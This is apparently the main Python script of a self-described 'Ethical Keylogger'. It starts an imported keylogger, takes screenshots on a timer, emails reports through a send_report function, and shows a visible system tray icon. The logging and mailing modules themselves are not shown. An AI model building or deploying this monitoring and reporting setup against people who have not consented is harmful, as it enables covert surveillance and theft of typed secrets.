import time
import json
import threading
from modules.keylogger import Keylogger
from modules.screenshot import capture_screenshot
from modules.email_sender import send_report
import schedule
import tkinter as tk
from tkinter import simpledialog
from pystray import MenuItem as item
import pystray
from PIL import Image
import os
import sys
import json


if getattr(sys, 'frozen', False):
    base_dir = os.path.dirname(sys.executable)

else:
    base_dir = os.path.dirname(os.path.abspath(__file__))


config_path = os.path.join(base_dir, "./config.json")
with open(config_path) as f:
    config = json.load(f)





# Load configuration
with open("config.json") as f:
    config = json.load(f)

def run_scheduler():
    """Run the scheduler in a separate thread."""
    while True:
        schedule.run_pending()
        time.sleep(1)

def update_config(key, value):
    """Update the configuration file."""
    config[key] = value
    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

def open_config_gui():
    """Open a GUI to update configuration settings."""
    root = tk.Tk()
    root.withdraw()  # Hide the main window

    # Example: Update screenshot interval
    new_interval = simpledialog.askinteger("Configuration", "Enter new screenshot interval (seconds):")
    if new_interval:
        update_config("screenshot_interval", new_interval)
        schedule.clear("screenshot")  # Clear existing schedule
        schedule.every(new_interval).seconds.do(capture_screenshot)  # Update schedule

def exit_program(icon):
    """Stop the program."""
    icon.stop()
    exit(0)

def create_system_tray():
    """Create a system tray icon with a menu."""
    image = Image.open("icon.png")  # Replace with your icon file
    menu = (
        item("Configure", open_config_gui),
        item("Exit", exit_program),
    )
    icon = pystray.Icon("Ethical Keylogger", image, "Ethical Keylogger", menu)
    icon.run()

def main():
    # Initialize the keylogger
    keylogger = Keylogger()

    # Schedule tasks
    schedule.every(config["screenshot_interval"]).seconds.do(capture_screenshot)
    schedule.every(config["report_interval"]).seconds.do(send_report)

    # Start the scheduler in a separate thread
    scheduler_thread = threading.Thread(target=run_scheduler)
    scheduler_thread.daemon = True  # Daemonize thread to exit when the main program exits
    scheduler_thread.start()

    # Start the keylogger in the main thread
    keylogger.start()

    # Create the system tray icon
    system_tray_thread = threading.Thread(target=create_system_tray)
    system_tray_thread.daemon = True
    system_tray_thread.start()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Program stopped.")

if __name__ == "__main__":
    main()